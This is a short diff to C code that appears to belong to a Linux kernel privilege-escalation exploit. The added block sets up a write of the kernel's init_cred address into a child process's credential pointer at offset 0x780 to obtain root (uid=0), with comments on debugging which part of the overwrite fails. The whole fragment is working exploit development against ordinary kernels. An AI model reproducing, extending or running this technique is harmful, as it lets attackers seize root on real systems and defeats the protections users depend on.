@@ -445,6 +445,26 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
         }
+        if (env_flag("MODE4_INIT780", 0) && g_child_task) {
+          /* TEST (Jev recommendation, 09-20): write the REAL init_cred
+           * kernel address to child+0x780 — a KNOWN-VALID cred object.
+           * Child survives with uid=0 (even briefly) → the +0x780 slot
+           * works; our cred copy is the problem. Child dies instantly →
+           * the +0x780 slot itself is broken (something beyond cred
+           * content). Guard will eventually kill (uid drop), but the
+           * child should survive its FIRST syscalls (addr_limit=USER_DS
+           * → guard's addr_limit gate returns early). */
+          uint64_t ic_off =
+              (active_offsets && active_offsets->off_init_cred)
+                  ? (uint64_t)active_offsets->off_init_cred
+                  : 0x027E0BE0ULL;
+          g_main_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + ic_off);
+          g_main_left = (uint64_t)(g_child_task + 0x780);
+          pr_info("JC2 INIT780: pc=%016llx (REAL init_cred) "
+                  "left=%016llx (child+0x780) — Jev diagnostic\n",
+                  (unsigned long long)g_main_pc,
+                  (unsigned long long)g_main_left);
+        }
         if (env_flag("MODE4_SAME_CRED", 0) && g_child_task) {
           /* TEST A/C (09-20 decisive): write a QUIET PAGE value into
            * +0x780 — not the original cred (can't read it), but our
